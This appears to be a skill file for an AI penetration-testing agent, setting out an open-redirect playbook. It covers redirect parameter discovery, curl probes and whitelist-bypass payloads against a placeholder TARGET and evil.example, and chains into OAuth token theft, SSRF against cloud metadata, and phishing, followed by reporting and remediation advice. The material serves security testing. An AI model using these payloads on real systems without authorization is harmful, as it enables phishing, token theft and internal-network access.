---
name: open-redirect
description: Open-redirect playbook — test redirect parameters (next=, redirect=, return=, url=, continue=, dest=, callback) for host/whitelist bypass, and chain redirects into OAuth token theft, SSRF, or phishing. Use when login flows, payment flows, or SSO return URLs accept a "where to go next" parameter — especially when combined with other findings.
allowed-tools:
  - http
  - shell
  - file_write
---

# Open redirect playbook

Goal: prove that an attacker-supplied URL survives the app's redirect logic and lands the user on an attacker host. Standalone it is low/medium severity; chained with OAuth or CSRF it becomes high — always try the chains.

## 1. Find redirect parameters

Watch login/SSO/logout/payment flows (browser capture) for params like: `next`, `redirect`, `redirect_uri`, `return`, `returnTo`, `returnto`, `continue`, `dest`, `target`, `url`, `goto`, `callback`, `out`, `view`. Also domain-level: `//`, `https:` in the URL path:

```sh
curl -ksS -I "https://TARGET/login?next=https://evil.example"
curl -ksS -I "https://TARGET//evil.example"                      # protocol-relative path trick
curl -ksS -I "https://TARGET/%2f%2fevil.example"                 # encoded
```

## 2. Bypass whitelist checks

Sorted by reliability — test until one redirects to a host you control:

```sh
# plain https
"next=https://evil.example"
# protocol-relative + double slash
"next=//evil.example"        "next=https:%2f%2fevil.example"
# subdomain/prefix tricks when the app validates a startsWith/endsWith/contains
"next=https://TARGET.evil.example"   "next=https://evil.example?next=https://TARGET"
"next=https://evil.example#@TARGET"  "next=https://TARGET@evil.example"
"next=evil.example"           "next=https://TARGET.evil"
# backslashes / control chars / encoded dots
"next=https:\\evil.example"   "next=\/\/evil.example"   "next=https://evil%2eexample"
```

Record the redirect status code (301/302/303) and the `Location:` header — that is your evidence.

## 3. Chains worth reporting

- **OAuth/SSO**: `redirect_uri` on the provider flow that allows a wildcard → token theft. Test `redirect_uri=https://evil.example` and subdomain variants.
- **CSRF/anti-CSRF + redirect**: if `next` is used as the anti-CSRF return, a user clicking an attacker link completes an action AND exfils via redirect.
- **SSRF assist**: some redirect endpoints fetch the URL server-side (open redirect as a server-side follow) → feed internal URLs (`http://169.254.169.254/`, `http://localhost/`) and check for internal responses (document as SSRF, see ssrf skill).
- **Phishing**: a `TARGET`-domain link that bounces to a fake login — mention it, but don't overstate severity.

## 4. Reporting

Evidence: request with the param + the 3xx response `Location:` header to your controlled host, or a captured second request (browser proof). Impact: phishing credibility, OAuth token theft when `redirect_uri` is involved, CSRF-chain assist. Remediation: strict allowlist of exact origins for redirect targets; validate server-side only.

When you have the Location header pointing off-host, call `confirm_finding`.